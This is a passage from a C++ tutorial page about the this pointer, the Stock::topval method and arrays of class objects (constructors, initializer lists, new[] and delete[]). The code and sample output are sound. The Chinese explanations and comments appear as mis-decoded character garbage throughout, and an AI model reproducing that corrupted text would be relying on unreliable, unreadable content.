class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­æ·»åŠ å£°æ˜</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors, destructor, buy, sell, update, show ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°å¢æ–¹æ³•ï¼šæ¯”è¾ƒæ€»ä»·å€¼ï¼Œè¿”å›ä»·å€¼æ›´é«˜çš„å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">    <span class="comment">// ç¬¬ä¸€ä¸ªconstï¼ˆè¿”å›å€¼å‰ï¼‰ï¼šè¡¨ç¤ºè¿”å›çš„å¼•ç”¨æ˜¯å¸¸é‡ï¼Œä¸èƒ½è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="comment">// ç¬¬äºŒä¸ªconstï¼ˆå‚æ•°ä¸­ï¼‰  ï¼šè¡¨ç¤ºå‚æ•°æ˜¯å¸¸é‡å¼•ç”¨ï¼Œå‡½æ•°å†…ä¸èƒ½ä¿®æ”¹å‚æ•°</span></span><br><span class="line">    <span class="comment">// ç¬¬ä¸‰ä¸ªconstï¼ˆå‡½æ•°æœ«å°¾ï¼‰ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°ï¼Œä¸èƒ½ä¿®æ”¹è°ƒç”¨å¯¹è±¡çš„æˆå‘˜å˜é‡</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨ stock.cpp ä¸­æ·»åŠ å®šä¹‰</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... å…¶ä»–å®šä¹‰ ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ topval æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">Stock::topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// this-&gt;total_val æ˜¯è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ (e.g., stock1) çš„æ€»ä»·å€¼</span></span><br><span class="line">    <span class="comment">// s.total_val æ˜¯ä¼ å…¥çš„å‚æ•°å¯¹è±¡ (e.g., stock2) çš„æ€»ä»·å€¼</span></span><br><span class="line">    <span class="keyword">if</span> (s.total_val &gt; <span class="keyword">this</span>-&gt;total_val) &#123;</span><br><span class="line">        <span class="keyword">return</span> s; <span class="comment">// è¿”å›ä¼ å…¥çš„å¯¹è±¡ s</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡è‡ªèº« (*this)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šå‡½æ•°å£°æ˜å’Œå®šä¹‰æœ«å°¾çš„ const è¡¨ç¤ºæ­¤å‡½æ•°ä¸ä¼šä¿®æ”¹ä»»ä½• Stock å¯¹è±¡ï¼Œ</span></span><br><span class="line">    <span class="comment">// å› æ­¤ this çš„ç±»å‹æ˜¯ const Stock* constï¼Œ*this çš„ç±»å‹æ˜¯ const Stock&amp;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Company A&quot;</span>, <span class="number">100</span>, <span class="number">10.0</span>)</span></span>; <span class="comment">// total_val = 1000.0</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Company B&quot;</span>, <span class="number">50</span>, <span class="number">25.0</span>)</span></span>;  <span class="comment">// total_val = 1250.0</span></span><br><span class="line"></span><br><span class="line">    stock1.show();</span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Stock&amp; top = stock1.topval(stock2); <span class="comment">// è°ƒç”¨ stock1.topvalï¼Œä¼ å…¥ stock2</span></span><br><span class="line">                                              <span class="comment">// å†…éƒ¨æ¯”è¾ƒ s(stock2).total_val å’Œ this(stock1)-&gt;total_val</span></span><br><span class="line">                                              <span class="comment">// å› ä¸º stock2 ä»·å€¼æ›´é«˜ï¼Œè¿”å› stock2 çš„å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nTop value stock:\n&quot;</span>;</span><br><span class="line">    top.show(); <span class="comment">// æ˜¾ç¤ºçš„æ˜¯ stock2 çš„ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>this-&gt;total_val</code> æ˜ç¡®è¡¨ç¤ºè®¿é—®çš„æ˜¯è°ƒç”¨ <code>topval</code> å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡ï¼ˆ<code>stock1</code>ï¼‰çš„ <code>total_val</code> æˆå‘˜ï¼Œè€Œ <code>s.total_val</code> è®¿é—®çš„æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’è¿›æ¥çš„å¯¹è±¡ï¼ˆ<code>stock2</code>ï¼‰çš„ <code>total_val</code>ã€‚<code>return *this;</code> åˆ™è¿”å›äº†è°ƒç”¨å¯¹è±¡ <code>stock1</code> æœ¬èº«çš„å¼•ç”¨ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>  <code>this</code> æ˜¯ä¸€ä¸ªæŒ‡å‘<strong>è°ƒç”¨å¯¹è±¡</strong>çš„æŒ‡é’ˆï¼Œåœ¨éé™æ€æˆå‘˜å‡½æ•°å†…éƒ¨å¯ç”¨ã€‚</li><li>  å®ƒä½¿å¾—æˆå‘˜å‡½æ•°èƒ½å¤Ÿè®¿é—®å’Œæ“ä½œè°ƒç”¨å®ƒçš„é‚£ä¸ªç‰¹å®šå¯¹è±¡çš„æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°ã€‚</li><li>  å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ<code>this</code> çš„ä½¿ç”¨æ˜¯éšå¼çš„ã€‚</li><li>æ˜¾å¼ä½¿ç”¨ <code>this</code> ä¸»è¦ç”¨äºï¼š<ul><li>  åŒºåˆ†åŒåçš„å‚æ•°å’Œæ•°æ®æˆå‘˜ã€‚</li><li>  ä»æˆå‘˜å‡½æ•°ä¸­è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨æˆ–æŒ‡é’ˆï¼ˆå¸¸ç”¨äºæ–¹æ³•é“¾ï¼‰ã€‚</li></ul></li><li>  <code>this</code> æŒ‡é’ˆçš„ç±»å‹å–å†³äºæˆå‘˜å‡½æ•°æ˜¯å¦ä¸º <code>const</code>ã€‚</li></ul><h2 id="10-5-å¯¹è±¡æ•°ç»„"><a href="#10-5-å¯¹è±¡æ•°ç»„" class="headerlink" title="10.5 å¯¹è±¡æ•°ç»„"></a>10.5 å¯¹è±¡æ•°ç»„</h2><p>å°±åƒå¯ä»¥åˆ›å»º <code>int</code>ã€<code>double</code> æˆ– <code>char</code> çš„æ•°ç»„ä¸€æ ·ï¼Œä½ ä¹Ÿå¯ä»¥åˆ›å»º<strong>ç±»å¯¹è±¡</strong>çš„æ•°ç»„ã€‚æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡ã€‚</p><h3 id="å£°æ˜å¯¹è±¡æ•°ç»„"><a href="#å£°æ˜å¯¹è±¡æ•°ç»„" class="headerlink" title="å£°æ˜å¯¹è±¡æ•°ç»„"></a>å£°æ˜å¯¹è±¡æ•°ç»„</h3><p>å£°æ˜å¯¹è±¡æ•°ç»„çš„è¯­æ³•ä¸å£°æ˜åŸºæœ¬ç±»å‹æ•°ç»„ç±»ä¼¼ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName arrayName[numberOfElements];</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¦åˆ›å»ºä¸€ä¸ªåŒ…å« 4 ä¸ª <code>Stock</code> å¯¹è±¡çš„æ•°ç»„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// å‡è®¾ Stock ç±»å®šä¹‰åœ¨æ­¤</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line">Stock myStocks[STKS]; <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å« 4 ä¸ª Stock å¯¹è±¡çš„æ•°ç»„</span></span><br></pre></td></tr></table></figure><h3 id="æ„é€ å‡½æ•°çš„è°ƒç”¨"><a href="#æ„é€ å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="æ„é€ å‡½æ•°çš„è°ƒç”¨"></a>æ„é€ å‡½æ•°çš„è°ƒç”¨</h3><p>å½“ç¨‹åºåˆ›å»ºå¯¹è±¡æ•°ç»„æ—¶ï¼Œå®ƒéœ€è¦ä¸ºæ•°ç»„ä¸­çš„<strong>æ¯ä¸ªå…ƒç´ ï¼ˆå¯¹è±¡ï¼‰</strong>è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p><ul><li><p><strong>é»˜è®¤æ„é€ å‡½æ•°:</strong> å¦‚æœåœ¨å£°æ˜æ•°ç»„æ—¶<strong>æ²¡æœ‰</strong>ä¸ºå…ƒç´ æä¾›æ˜¾å¼çš„åˆå§‹åŒ–å€¼ï¼Œç¨‹åºå°†ä¸ºæ•°ç»„ä¸­çš„<strong>æ¯ä¸ªå…ƒç´ </strong>è°ƒç”¨ç±»çš„**é»˜è®¤æ„é€ å‡½æ•° (Default Constructor)**ã€‚</p><ul><li>  åœ¨ä¸Šé¢çš„ä¾‹å­ <code>Stock myStocks[STKS];</code> ä¸­ï¼Œ<code>Stock::Stock()</code> è¿™ä¸ªé»˜è®¤æ„é€ å‡½æ•°å°†è¢«è°ƒç”¨ 4 æ¬¡ï¼Œä¸º <code>myStocks[0]</code>, <code>myStocks[1]</code>, <code>myStocks[2]</code>, <code>myStocks[3]</code> è¿™å››ä¸ªå¯¹è±¡è¿›è¡Œåˆå§‹åŒ–ã€‚</li><li>  <strong>é‡è¦:</strong> å¦‚æœç±»<strong>æ²¡æœ‰</strong>é»˜è®¤æ„é€ å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œä½ åªå®šä¹‰äº†å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œè€Œæ²¡æœ‰å®šä¹‰æ— å‚æ•°çš„æ„é€ å‡½æ•°æˆ–ä½¿ç”¨ <code>= default</code>ï¼‰ï¼Œé‚£ä¹ˆå°è¯•åˆ›å»ºåƒ <code>Stock myStocks[STKS];</code> è¿™æ ·çš„æœªåˆå§‹åŒ–æ•°ç»„å°†å¯¼è‡´<strong>ç¼–è¯‘é”™è¯¯</strong>ã€‚</li></ul></li><li><p><strong>å¸¦å‚æ•°çš„æ„é€ å‡½æ•°:</strong> ä½ å¯ä»¥åœ¨å£°æ˜æ•°ç»„æ—¶ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨æ¥ä¸ºæ•°ç»„å…ƒç´ æŒ‡å®šä¸åŒçš„æ„é€ å‡½æ•°è°ƒç”¨ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">2</span>;</span><br><span class="line">Stock portfolio[STKS] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>), <span class="comment">// è°ƒç”¨ Stock(const string&amp;, long, double)</span></span><br><span class="line">    Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>) <span class="comment">// è°ƒç”¨ Stock(const string&amp;, long, double)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 åŠä»¥åç‰ˆæœ¬å¯ä»¥ä½¿ç”¨æ›´ç®€æ´çš„åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line">Stock investments[] = &#123; <span class="comment">// ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è®¡ç®—æ•°ç»„å¤§å° (3)</span></span><br><span class="line">    Stock(<span class="string">&quot;Fleep Co&quot;</span>, <span class="number">5</span>, <span class="number">15.5</span>),</span><br><span class="line">    Stock(), <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock()</span></span><br><span class="line">    Stock(<span class="string">&quot;MacroHard&quot;</span>, <span class="number">18</span>, <span class="number">75.0</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>  åœ¨ <code>portfolio</code> æ•°ç»„çš„ä¾‹å­ä¸­ï¼Œ<code>portfolio[0]</code> ä½¿ç”¨æä¾›çš„å‚æ•°è°ƒç”¨ <code>Stock(const string&amp;, long, double)</code> æ„é€ å‡½æ•°ï¼Œ<code>portfolio[1]</code> ä¹Ÿä¸€æ ·ã€‚</p></li><li><p>  åœ¨ <code>investments</code> æ•°ç»„çš„ä¾‹å­ä¸­ï¼Œ<code>investments[0]</code> å’Œ <code>investments[2]</code> è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œè€Œ <code>investments[1]</code> åˆ™æ˜¾å¼è°ƒç”¨äº†é»˜è®¤æ„é€ å‡½æ•° <code>Stock()</code>ã€‚</p></li><li><p>å¦‚æœåˆå§‹åŒ–åˆ—è¡¨æä¾›çš„åˆå§‹å€¼æ•°é‡<strong>å°‘äº</strong>æ•°ç»„å¤§å°ï¼Œåˆ™å‰©ä½™çš„å…ƒç´ å°†ä½¿ç”¨<strong>é»˜è®¤æ„é€ å‡½æ•°</strong>è¿›è¡Œåˆå§‹åŒ–ã€‚å¦‚æœç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿™å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Stock funds[<span class="number">4</span>] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A Corp&quot;</span>, <span class="number">10</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B Ltd&quot;</span>, <span class="number">20</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// funds[2] å’Œ funds[3] å°†ä½¿ç”¨é»˜è®¤æ„é€ å‡½æ•° Stock() åˆå§‹åŒ–</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="è®¿é—®å¯¹è±¡æ•°ç»„æˆå‘˜"><a href="#è®¿é—®å¯¹è±¡æ•°ç»„æˆå‘˜" class="headerlink" title="è®¿é—®å¯¹è±¡æ•°ç»„æˆå‘˜"></a>è®¿é—®å¯¹è±¡æ•°ç»„æˆå‘˜</h3><p>è®¿é—®æ•°ç»„ä¸­å¯¹è±¡çš„æˆå‘˜ä¸è®¿é—®åŸºæœ¬ç±»å‹æ•°ç»„å…ƒç´ ç±»ä¼¼ï¼Œå…ˆç”¨ç´¢å¼• <code>[]</code> é€‰æ‹©æ•°ç»„ä¸­çš„ç‰¹å®šå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ç‚¹å· <code>.</code> è®¿é—®è¯¥å¯¹è±¡çš„å…¬æœ‰æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨åˆ›å»ºå¹¶åˆå§‹åŒ–æ•°ç»„</span></span><br><span class="line">    Stock stocks[STKS] = &#123;</span><br><span class="line">        Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Monolithic Obelisks&quot;</span>, <span class="number">130</span>, <span class="number">3.25</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">60</span>, <span class="number">6.5</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stock holdings:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> st;</span><br><span class="line">    <span class="keyword">for</span> (st = <span class="number">0</span>; st &lt; STKS; st++) &#123;</span><br><span class="line">        stocks[st].show(); <span class="comment">// è°ƒç”¨æ•°ç»„ä¸­ç¬¬ st ä¸ªå¯¹è±¡çš„ show() æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰¾åˆ°ä»·å€¼æœ€é«˜çš„è‚¡ç¥¨ (ä½¿ç”¨ä¸Šä¸€èŠ‚çš„ topval å‡è®¾å®ƒå·²æ·»åŠ )</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼štopval éœ€è¦æ·»åŠ åˆ° Stock ç±»ä¸­æ‰èƒ½ç¼–è¯‘</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    const Stock* top = &amp;stocks[0]; // å‡è®¾ç¬¬ä¸€ä¸ªæ˜¯æœ€é«˜çš„</span></span><br><span class="line"><span class="comment">    for (st = 1; st &lt; STKS; st++) &#123;</span></span><br><span class="line"><span class="comment">        top = &amp;top-&gt;topval(stocks[st]); // æ¯”è¾ƒå¹¶æ›´æ–° top æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    std::cout &lt;&lt; &quot;\nMost valuable holding:\n&quot;;</span></span><br><span class="line"><span class="comment">    top-&gt;show(); // æ˜¾ç¤ºä»·å€¼æœ€é«˜çš„è‚¡ç¥¨ä¿¡æ¯</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿®æ”¹æ•°ç»„ä¸­æŸä¸ªå¯¹è±¡çš„çŠ¶æ€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBuying more Boffo Objects...\n&quot;</span>;</span><br><span class="line">    stocks[<span class="number">1</span>].buy(<span class="number">50</span>, <span class="number">2.5</span>); <span class="comment">// è°ƒç”¨ stocks[1] å¯¹è±¡çš„ buy() æ–¹æ³•</span></span><br><span class="line">    stocks[<span class="number">1</span>].show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç¤ºä¾‹ (å‡è®¾ <code>topval</code> éƒ¨åˆ†è¢«æ³¨é‡Šæ‰):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Constructor using Monolithic Obelisks called</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Stock holdings:</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Company: Boffo Objects  Shares: 200</span><br><span class="line">  Share Price: $2.000  Total Worth: $400.00</span><br><span class="line">Company: Monolithic Obelisks  Shares: 130</span><br><span class="line">  Share Price: $3.250  Total Worth: $422.50</span><br><span class="line">Company: Fleep Enterprises  Shares: 60</span><br><span class="line">  Share Price: $6.500  Total Worth: $390.00</span><br><span class="line"></span><br><span class="line">Buying more Boffo Objects...</span><br><span class="line">Company: Boffo Objects  Shares: 250</span><br><span class="line">  Share Price: $2.500  Total Worth: $625.00</span><br><span class="line">Bye, Fleep Enterprises!</span><br><span class="line">Bye, Monolithic Obelisks!</span><br><span class="line">Bye, Boffo Objects!</span><br><span class="line">Bye, NanoSmart!</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç¨‹åºç»“æŸæ—¶ï¼Œæ•°ç»„ <code>stocks</code> ä¸­çš„æ¯ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ï¼ˆæŒ‰ä¸æ„é€ ç›¸åçš„é¡ºåºï¼‰ã€‚</p><h3 id="åŠ¨æ€å¯¹è±¡æ•°ç»„"><a href="#åŠ¨æ€å¯¹è±¡æ•°ç»„" class="headerlink" title="åŠ¨æ€å¯¹è±¡æ•°ç»„"></a>åŠ¨æ€å¯¹è±¡æ•°ç»„</h3><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>new</code> æ¥åˆ›å»ºåŠ¨æ€çš„å¯¹è±¡æ•°ç»„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">5</span>;</span><br><span class="line">Stock *portfolio = <span class="keyword">new</span> Stock[size]; <span class="comment">// åˆ›å»ºåŒ…å« 5 ä¸ª Stock å¯¹è±¡çš„åŠ¨æ€æ•°ç»„</span></span><br></pre></td></tr></table></figure><ul><li><p>  <strong>é»˜è®¤æ„é€ å‡½æ•°è¦æ±‚:</strong> ä½¿ç”¨ <code>new ClassName[size]</code> è¿™ç§å½¢å¼æ—¶ï¼Œ<strong>å¿…é¡»</strong>è¦æ±‚ç±»å…·æœ‰å¯è®¿é—®çš„<strong>é»˜è®¤æ„é€ å‡½æ•°</strong>ï¼Œå› ä¸ºå®ƒä¼šä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚</p></li><li><p><strong>C++11 åˆ—è¡¨åˆå§‹åŒ– (å¯é€‰):</strong> C++11 å…è®¸åœ¨ä½¿ç”¨ <code>new</code> åˆ›å»ºæ•°ç»„æ—¶æä¾›åˆå§‹åŒ–åˆ—è¡¨ï¼Œè¿™æ ·å¯ä»¥è°ƒç”¨ç‰¹å®šçš„æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å¦‚æœæä¾›äº†æ‰€æœ‰å…ƒç´ çš„åˆå§‹åŒ–å€¼ï¼Œåˆ™ä¸å¼ºåˆ¶è¦æ±‚é»˜è®¤æ„é€ å‡½æ•°ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++11 or later</span></span><br><span class="line">Stock *p_list = <span class="keyword">new</span> Stock[<span class="number">3</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;X Inc&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Y Ltd&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Z LLC&quot;</span>, <span class="number">3</span>, <span class="number">3.0</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Stock *p_partial = <span class="keyword">new</span> Stock[<span class="number">4</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// p_partial[2] å’Œ p_partial[3] éœ€è¦é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>  <strong>è®¿é—®:</strong> è®¿é—®åŠ¨æ€æ•°ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨æ•°ç»„è¡¨ç¤ºæ³• <code>portfolio[i].member</code> æˆ–æŒ‡é’ˆè¡¨ç¤ºæ³• <code>(portfolio + i)-&gt;member</code>ã€‚</p></li><li><p><strong>é‡Šæ”¾å†…å­˜:</strong> å¿…é¡»ä½¿ç”¨ <code>delete []</code> æ¥é‡Šæ”¾åŠ¨æ€åˆ†é…çš„å¯¹è±¡æ•°ç»„ï¼Œä»¥ç¡®ä¿æ¯ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°éƒ½è¢«æ­£ç¡®è°ƒç”¨ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] portfolio; <span class="comment">// è°ƒç”¨ 5 æ¬¡ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾å†…å­˜</span></span><br><span class="line"><span class="keyword">delete</span> [] p_list;</span><br><span class="line"><span class="keyword">delete</span> [] p_partial;</span><br></pre></td></tr></table></figure><p>  